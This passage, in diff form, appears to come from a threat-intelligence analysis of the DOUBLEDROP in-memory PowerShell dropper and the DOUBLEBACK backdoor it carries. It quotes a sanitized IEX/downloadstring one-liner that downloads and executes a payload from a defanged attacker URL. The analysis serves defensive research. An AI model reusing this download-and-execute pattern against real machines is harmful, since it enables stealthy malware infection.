@@ -1,0 +1,7 @@
+
+Note, that the downloaded dropper does not touch the file system and it is executed directly from memory.
+A sanitized version of the code, observed in the first phishing wave, is shown in Figure 4.
+IEX (New-Object Net.
+Webclient).downloadstring(\"hxxp://p-leh[.]com/update_java.dat\") Figure 4: Downloading and executing of the DOUBLEDROP dropper DOUBLEDROP Dropper component Overview
+The dropper component is implemented as an obfuscated in-memory dropper written in PowerShell.
+Two payloads are embedded in the script—the same instances of the DOUBLEBACK backdoor compiled for 32 and 64-bit architectures.
